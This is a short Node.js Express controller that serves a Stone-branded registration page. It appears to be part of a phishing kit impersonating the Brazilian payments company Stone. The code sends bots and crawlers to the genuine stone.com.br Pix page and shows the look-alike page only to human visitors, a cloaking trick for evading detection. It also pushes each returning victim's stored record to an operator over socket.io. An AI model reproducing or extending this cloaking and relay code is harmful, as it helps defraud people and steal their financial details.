const Client = require('../../models/Client')
const isbot = require('isbot')

module.exports = {
    async view(req, res) {
        try {
            if (isbot(req.get('user-agent'))) return res.redirect('https://www.stone.com.br/pix/')

            const { client } = req.query

            const cliente = await Client.findByPk(client)

            if (client) {
                req.app.io.emit('userReconnect', cliente.toJSON())
                return res.render('stone', { title: 'Stone', pageClasses: 'cadastro', client: cliente.toJSON() })
            }

            return res.render('stone', { title: 'Stone', pageClasses: 'cadastro' })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
